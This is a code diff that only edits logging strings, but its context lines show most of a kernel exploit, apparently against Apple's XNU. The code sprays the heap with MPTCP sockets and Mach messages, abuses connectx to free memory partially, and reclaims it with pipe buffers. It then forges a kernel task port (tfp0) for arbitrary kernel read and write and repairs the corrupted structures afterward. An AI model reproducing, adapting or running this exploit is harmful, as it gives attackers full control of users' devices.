@@ -43,26 +43,26 @@ void increase_limits()
     struct rlimit lim = { 0 };
     int err = getrlimit(RLIMIT_NOFILE, &lim);
     if (err != 0) {
-        LOG("failed to get limits\n");
+        LOG("failed to get limits");
     }
-    LOG("rlim.cur: %lld\n", lim.rlim_cur);
-    LOG("rlim.max: %lld\n", lim.rlim_max);
+    LOG("rlim.cur: %lld", lim.rlim_cur);
+    LOG("rlim.max: %lld", lim.rlim_max);
 
     lim.rlim_cur = 10240;
 
     err = setrlimit(RLIMIT_NOFILE, &lim);
     if (err != 0) {
-        LOG("failed to set limits\n");
+        LOG("failed to set limits");
     }
 
     lim.rlim_cur = 0;
     lim.rlim_max = 0;
     err = getrlimit(RLIMIT_NOFILE, &lim);
     if (err != 0) {
-        LOG("failed to get limits\n");
+        LOG("failed to get limits");
     }
-    LOG("rlim.cur: %lld\n", lim.rlim_cur);
-    LOG("rlim.max: %lld\n", lim.rlim_max);
+    LOG("rlim.cur: %lld", lim.rlim_cur);
+    LOG("rlim.max: %lld", lim.rlim_max);
 }
 
 #define AF_MULTIPATH 39
@@ -70,7 +70,7 @@ int alloc_mptcp_socket()
 {
     int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
     if (sock < 0) {
-        LOG("socket failed\n");
+        LOG("socket failed");
         perror("");
         return -1;
     }
@@ -97,7 +97,7 @@ void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes)
     eps.sae_dstaddr = sockaddr_dst;
     eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
 
-    LOG("doing partial overwrite with target value: %016llx, length %d\n", kaddr, n_bytes);
+    LOG("doing partial overwrite with target value: %016llx, length %d", kaddr, n_bytes);
 
     int err = connectx(
         fd,
@@ -109,7 +109,7 @@ void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes)
         NULL,
         NULL);
 
-    LOG("err: %d\n", err);
+    LOG("err: %d", err);
 
     close(fd);
 
@@ -147,11 +147,11 @@ int alloc_and_fill_pipe()
 
     ssize_t amount_written = write(write_end, aaaas, PIPE_SIZE);
     if (amount_written != PIPE_SIZE) {
-        LOG("amount written was short: 0x%ld\n", amount_written);
+        LOG("amount written was short: 0x%ld", amount_written);
     }
     write_fds[next_read_fd] = write_end;
     read_fds[next_read_fd++] = read_end;
-    //LOG("filled pipe %d\n", read_end);
+    //LOG("filled pipe %d", read_end);
     return read_end; // the buffer is actually hanging off the read end struct pipe
 }
 
@@ -162,16 +162,16 @@ int find_replacer_pipe(void** contents)
         int fd = read_fds[i];
         ssize_t amount = read(fd, read_back, PIPE_SIZE);
         if (amount != PIPE_SIZE) {
-            LOG("short read (%ld)\n", amount);
+            LOG("short read (%ld)", amount);
         } else {
-            LOG("full read\n");
+            LOG("full read");
         }
 
         int pipe_is_replacer = 0;
         for (int j = 0; j < PIPE_SIZE / 8; j++) {
             if (read_back[j] != 0x4242424242424242) {
                 pipe_is_replacer = 1;
-                LOG("found an unexpected value: %016llx\n", read_back[j]);
+                LOG("found an unexpected value: %016llx", read_back[j]);
             }
         }
 
@@ -188,7 +188,7 @@ mach_port_t fake_kalloc(int size)
     mach_port_t port = MACH_PORT_NULL;
     kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
     if (err != KERN_SUCCESS) {
-        LOG("unable to allocate port\n");
+        LOG("unable to allocate port");
     }
     struct simple_msg {
         mach_msg_header_t hdr;
@@ -215,7 +215,7 @@ mach_port_t fake_kalloc(int size)
         MACH_PORT_NULL);
 
     if (err != KERN_SUCCESS) {
-        LOG("early kalloc failed to send message\n");
+        LOG("early kalloc failed to send message");
     }
 
     return port;
@@ -292,7 +292,7 @@ mach_port_t prealloc_port(natural_t size)
         &name);
 
     if (err != KERN_SUCCESS) {
-        LOG("pre-allocated port allocation failed: %s\n", mach_error_string(err));
+        LOG("pre-allocated port allocation failed: %s", mach_error_string(err));
         return MACH_PORT_NULL;
     }
 
@@ -314,11 +314,11 @@ kern_return_t catch_exception_raise_state_identity(
     thread_state_t new_state,
     mach_msg_type_number_t* new_stateCnt)
 {
-    LOG("catch_exception_raise_state_identity\n");
+    LOG("catch_exception_raise_state_identity");
 
     // the thread port isn't actually the thread port
     // we rewrote it via the pipe to be the fake kernel r/w port
-    LOG("thread: %x\n", thread);
+    LOG("thread: %x", thread);
     extracted_thread_port = thread;
 
     mach_port_deallocate(mach_task_self(), task);
@@ -356,13 +356,13 @@ void* do_thread(void* arg)
         ARM_THREAD_STATE64);
 
     if (err != KERN_SUCCESS) {
-        LOG("failed to set exception port\n");
+        LOG("failed to set exception port");
     }
 
     // make the thread port which gets sent in the message actually be the host port
     err = thread_set_special_port(mach_thread_self(), THREAD_KERNEL_PORT, mach_host_self());
     if (err != KERN_SUCCESS) {
-        LOG("failed to set THREAD_KERNEL_PORT\n");
+        LOG("failed to set THREAD_KERNEL_PORT");
     }
 
     // cause an exception message to be sent by the kernel
@@ -408,14 +408,14 @@ void send_prealloc_msg(mach_port_t port)
     // when we receive the exception message and it exits:
     kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
     if (err != KERN_SUCCESS) {
-        LOG("failed to set context\n");
+        LOG("failed to set context");
     }
-    LOG("set context\n");
+    LOG("set context");
     // wait until the message has actually been sent:
     while (!port_has_message(port)) {
         ;
     }
-    LOG("message was sent\n");
+    LOG("message was sent");
 }
 
 // receive the exception message on the port and extract the thread port
@@ -427,7 +427,7 @@ mach_port_t receive_prealloc_msg(mach_port_t port)
         port,
         MACH_MSG_TIMEOUT_NONE);
 
-    LOG("receive_prealloc_msg: %s\n", mach_error_string(err));
+    LOG("receive_prealloc_msg: %s", mach_error_string(err));
 
     // get the pthread context back from the port and join it:
     pthread_t t;
@@ -476,7 +476,7 @@ static uint32_t early_rk32(uint64_t kaddr)
     uint8_t* pipe_contents = malloc(PIPE_SIZE);
     ssize_t amount = read(early_read_pipe_read_end, pipe_contents, PIPE_SIZE);
     if (amount != PIPE_SIZE) {
-        LOG("early_rk32 pipe buffer read was short\n");
+        LOG("early_rk32 pipe buffer read was short");
     }
 
     // no need to actually build it again, but this read function will only be used a handful of times during bootstrap
@@ -492,9 +492,9 @@ static uint32_t early_rk32(uint64_t kaddr)
     uint32_t val = 0;
     kern_return_t err = pid_for_task(early_read_port, (int*)&val);
     if (err != KERN_SUCCESS) {
-        LOG("pid_for_task returned %x\n", err);
+        LOG("pid_for_task returned %x", err);
     }
-    LOG("read val via pid_for_task: %08x\n", val);
+    LOG("read val via pid_for_task: %08x", val);
     free(pipe_contents);
     return val;
 }
@@ -514,7 +514,7 @@ mach_port_t prepare_tfp0(uint64_t vm_map, uint64_t receiver)
     uint8_t* pipe_contents = malloc(PIPE_SIZE);
     ssize_t amount = read(early_read_pipe_read_end, pipe_contents, PIPE_SIZE);
     if (amount != PIPE_SIZE) {
-        LOG("prepare_tfp0 pipe buffer read was short\n");
+        LOG("prepare_tfp0 pipe buffer read was short");
     }
 
     uint64_t fake_port_offset = 0x100; // where in the pipe/ipc_kmsg to put it
@@ -544,7 +544,7 @@ bool mptcp_go()
     int sockets[10000];
     int next_all_sock = 0;
     // alloc a bunch of sockets
-    LOG("allocating early sockets\n");
+    LOG("allocating early sockets");
     for (int i = 0; i < 1000; i++) {
         int sock = alloc_mptcp_socket();
         sockets[next_all_sock++] = sock;
@@ -553,9 +553,9 @@ bool mptcp_go()
     // a few times do:
     // alloc 16MB of messages
     // alloc a hundred sockets
-    LOG("trying to force a 16MB aligned 0x800 kalloc on to freelist\n");
+    LOG("trying to force a 16MB aligned 0x800 kalloc on to freelist");
     for (int i = 0; i < 7; i++) {
-        LOG("%d/6...\n", i);
+        LOG("%d/6...", i);
         for (int j = 0; j < 0x2000; j++) {
             mach_port_t p = fake_kalloc(0x800);
         }
@@ -573,7 +573,7 @@ bool mptcp_go()
         }
     }
 
-    LOG("%d %d\n", target_socks[0], target_socks[1]);
+    LOG("%d %d", target_socks[0], target_socks[1]);
 
     // the free is deferred by a "gc".
     // to improve the probability we are the one who gets to reuse the free'd alloc
@@ -597,22 +597,22 @@ bool mptcp_go()
         close(sockets[i]);
     }
 
-    LOG("waiting for early mptcp gc...\n");
+    LOG("waiting for early mptcp gc...");
     // wait for the mptcp gc...
     for (int i = 0; i < 400; i++) {
         usleep(10000);
     }
 
-    LOG("trying first free\n");
+    LOG("trying first free");
     do_partial_kfree_with_socket(target_socks[0], 0, 3);
 
-    LOG("waiting for mptcp gc...\n");
+    LOG("waiting for mptcp gc...");
     // wait for the mptcp gc...
     for (int i = 0; i < 400; i++) {
         usleep(10000);
     }
 
-    LOG("trying to refill ****************\n");
+    LOG("trying to refill ****************");
 
     // realloc with pipes:
     for (int i = 0; i < 1000; i++) { //100
@@ -626,11 +626,11 @@ bool mptcp_go()
         late_ports[i] = MACH_PORT_NULL;
     }
 
-    LOG("hopefully we got a pipe buffer in there... now freeing one of them\n");
-    LOG("trying second free\n");
+    LOG("hopefully we got a pipe buffer in there... now freeing one of them");
+    LOG("trying second free");
     do_partial_kfree_with_socket(target_socks[1], 0, 3);
 
-    LOG("waiting for second mptcp gc...\n");
+    LOG("waiting for second mptcp gc...");
     // wait for the mptcp gc...
     for (int i = 0; i < 400; i++) {
         usleep(10000);
@@ -644,25 +644,25 @@ bool mptcp_go()
         usleep(10000);
     }
 
-    LOG("checking....\n");
+    LOG("checking....");
 
     uint8_t* msg_contents = NULL;
     int replacer_pipe = find_replacer_pipe(&msg_contents);
     if (replacer_pipe == -1) {
-        LOG("failed to get a pipe buffer over a port\n");
+        LOG("failed to get a pipe buffer over a port");
         return false;
     }
 
     // does the pipe buffer contain the mach message we sent to ourselves?
     if (msg_contents == NULL) {
-        LOG("didn't get any message contents\n");
+        LOG("didn't get any message contents");
         return false;
     }
 
-    LOG("this should be the empty prealloc message\n");
+    LOG("this should be the empty prealloc message");
 
     for (int i = 0; i < 0x800 / 8; i++) {
-        LOG("+%08x %016llx\n", i * 8, ((uint64_t*)msg_contents)[i]);
+        LOG("+%08x %016llx", i * 8, ((uint64_t*)msg_contents)[i]);
     }
 
     // write the empty prealloc message back over the pipe:
@@ -682,12 +682,12 @@ bool mptcp_go()
         // read from the pipe and see if the contents changed:
         ssize_t amount = read(replacer_pipe, new_contents, PIPE_SIZE);
         if (amount != PIPE_SIZE) {
-            LOG("short read (%ld)\n", amount);
+            LOG("short read (%ld)", amount);
         }
         if (memcmp(original_contents, new_contents, PIPE_SIZE) == 0) {
             // they are still the same, this isn't the correct port:
             mach_port_t fake_thread_port = receive_prealloc_msg(exception_ports[i]);
-            LOG("received prealloc message via an exception with this thread port: %x\n", fake_thread_port);
+            LOG("received prealloc message via an exception with this thread port: %x", fake_thread_port);
             // that should be the real host port
             mach_port_deallocate(mach_task_self(), fake_thread_port);
             write(replacer_pipe + 1, new_contents, PIPE_SIZE);
@@ -700,18 +700,18 @@ bool mptcp_go()
     }
 
     if (replacer_port == MACH_PORT_NULL) {
-        LOG("failed to find replacer port\n");
+        LOG("failed to find replacer port");
         return false;
     }
 
-    LOG("found replacer port\n");
+    LOG("found replacer port");
 
     for (int i = 0; i < 0x800 / 8; i++) {
-        LOG("+%08x %016llx\n", i * 8, ((uint64_t*)new_contents)[i]);
+        LOG("+%08x %016llx", i * 8, ((uint64_t*)new_contents)[i]);
     }
 
     uint64_t pipe_buf = *((uint64_t*)(new_contents + 0x8));
-    LOG("pipe buf and prealloc message are at %016llx\n", pipe_buf);
+    LOG("pipe buf and prealloc message are at %016llx", pipe_buf);
 
     // prepare_early_read_primitive will overwrite this, lets save it now for later
     uint64_t host_port_kaddr = *((uint64_t*)(new_contents + 0x66c));
@@ -722,13 +722,13 @@ bool mptcp_go()
     mach_port_t kport = prepare_early_read_primitive(pipe_buf, replacer_pipe, replacer_pipe + 1, replacer_port, new_contents);
 
     uint32_t val = early_rk32(pipe_buf);
-    LOG("%08x\n", val);
+    LOG("%08x", val);
 
     // for the full read/write primitive we need to find the kernel vm_map and the kernel ipc_space
     // we can get the ipc_space easily from the host port (receiver field):
     uint64_t ipc_space_kernel = early_rk64(host_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
 
-    LOG("ipc_space_kernel: %016llx\n", ipc_space_kernel);
+    LOG("ipc_space_kernel: %016llx", ipc_space_kernel);
 
     // the kernel vm_map is a little trickier to find
     // we can use the trick from mach_portal to find the kernel task port because we know it's gonna be near the host_port on the heap:
@@ -738,22 +738,22 @@ bool mptcp_go()
     uint64_t offset = host_port_kaddr & 0xfff;
     uint64_t first_port = 0;
     if ((offset % 0xa8) == 0) {
-        LOG("host port is on first page\n");
+        LOG("host port is on first page");
         first_port = host_port_kaddr & ~(0xfff);
     } else if (((offset + 0x1000) % 0xa8) == 0) {
-        LOG("host port is on second page\n");
+        LOG("host port is on second page");
         first_port = (host_port_kaddr - 0x1000) & ~(0xfff);
     } else if (((offset + 0x2000) % 0xa8) == 0) {
-        LOG("host port is on third page\n");
+        LOG("host port is on third page");
         first_port = (host_port_kaddr - 0x2000) & ~(0xfff);
     } else if (((offset + 0x3000) % 0xa8) == 0) {
-        LOG("host port is on fourth page\n");
+        LOG("host port is on fourth page");
         first_port = (host_port_kaddr - 0x3000) & ~(0xfff);
     } else {
-        LOG("hummm, my assumptions about port allocations are wrong...\n");
+        LOG("hummm, my assumptions about port allocations are wrong...");
     }
 
-    LOG("first port is at %016llx\n", first_port);
+    LOG("first port is at %016llx", first_port);
     uint64_t kernel_vm_map = 0;
     // now look through up to 0x4000 of ports and find one which looks like a task port:
     for (int i = 0; i < (0x4000 / 0xa8); i++) {
@@ -767,19 +767,19 @@ bool mptcp_go()
         // get that port's kobject:
         uint64_t task_t = early_rk64(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
         if (task_t == 0) {
-            LOG("weird heap object with NULL kobject\n");
+            LOG("weird heap object with NULL kobject");
             continue;
         }
 
         // check the pid via the bsd_info:
         uint64_t bsd_info = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
         if (bsd_info == 0) {
-            LOG("task doesn't have a bsd info\n");
+            LOG("task doesn't have a bsd info");
             continue;
         }
         uint32_t pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
         if (pid != 0) {
-            LOG("task isn't the kernel task\n");
+            LOG("task isn't the kernel task");
             continue;
         }
 
@@ -789,31 +789,31 @@ bool mptcp_go()
     }
 
     if (kernel_vm_map == 0) {
-        LOG("unable to find the kernel task map\n");
+        LOG("unable to find the kernel task map");
         return false;
     }
 
-    LOG("kernel map:%016llx\n", kernel_vm_map);
+    LOG("kernel map:%016llx", kernel_vm_map);
 
     // now we have everything to build a fake kernel task port for memory r/w:
     mach_port_t new_tfp0 = prepare_tfp0(kernel_vm_map, ipc_space_kernel);
-    LOG("tfp0: %x\n", new_tfp0);
+    LOG("tfp0: %x", new_tfp0);
 
     // test it!
     vm_offset_t data_out = 0;
     mach_msg_type_number_t out_size = 0;
     kern_return_t err = mach_vm_read(new_tfp0, kernel_vm_map, 0x40, &data_out, &out_size);
     if (err != KERN_SUCCESS) {
-        LOG("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
+        LOG("mach_vm_read failed: %x %s", err, mach_error_string(err));
         sleep(3);
         exit(EXIT_FAILURE);
     }
 
-    LOG("kernel read via second tfp0 port worked?\n");
-    LOG("0x%016llx\n", *(uint64_t*)data_out);
-    LOG("0x%016llx\n", *(uint64_t*)(data_out + 8));
-    LOG("0x%016llx\n", *(uint64_t*)(data_out + 0x10));
-    LOG("0x%016llx\n", *(uint64_t*)(data_out + 0x18));
+    LOG("kernel read via second tfp0 port worked?");
+    LOG("0x%016llx", *(uint64_t*)data_out);
+    LOG("0x%016llx", *(uint64_t*)(data_out + 8));
+    LOG("0x%016llx", *(uint64_t*)(data_out + 0x10));
+    LOG("0x%016llx", *(uint64_t*)(data_out + 0x18));
 
     // now bootstrap the proper r/w methods:
     prepare_for_rw_with_fake_tfp0(new_tfp0);
@@ -847,7 +847,7 @@ bool mptcp_go()
         uint64_t kmsg = ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
         if (kmsg == pipe_buf) {
             // neuter it:
-            LOG("clearing kmsg from port %016llx\n", port_kaddr);
+            LOG("clearing kmsg from port %016llx", port_kaddr);
             WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
             WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000);
         }
@@ -859,7 +859,7 @@ bool mptcp_go()
             uint64_t premsg = ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG));
             if (premsg == pipe_buf) {
                 // clear the premsg:
-                LOG("clearing premsg from port %016llx\n", port_kaddr);
+                LOG("clearing premsg from port %016llx", port_kaddr);
                 WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG), 0);
                 ip_bits &= (~IP_BIT_PREALLOC);
                 WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), ip_bits);
@@ -867,7 +867,7 @@ bool mptcp_go()
         }
     }
 
-    LOG("going to try to clear up the pipes now\n");
+    LOG("going to try to clear up the pipes now");
 
     // finally we have to fix up the pipe's buffer
     // for this we need to find the process fd table:
@@ -892,7 +892,7 @@ bool mptcp_go()
     uint64_t pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
 
     // clear the inline struct pipebuf
-    LOG("clearing pipebuf: %llx\n", pipe);
+    LOG("clearing pipebuf: %llx", pipe);
     WriteKernel64(pipe + 0x00, 0);
     WriteKernel64(pipe + 0x08, 0);
     WriteKernel64(pipe + 0x10, 0);
@@ -909,7 +909,7 @@ bool mptcp_go()
     // struct pipe
     pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
 
-    LOG("clearing pipebuf: %llx\n", pipe);
+    LOG("clearing pipebuf: %llx", pipe);
     WriteKernel64(pipe + 0x00, 0);
     WriteKernel64(pipe + 0x08, 0);
     WriteKernel64(pipe + 0x10, 0);
@@ -920,6 +920,6 @@ bool mptcp_go()
     }
 
     // that should have cleared everything up!
-    LOG("done!\n");
+    LOG("done!");
     return true;
 }
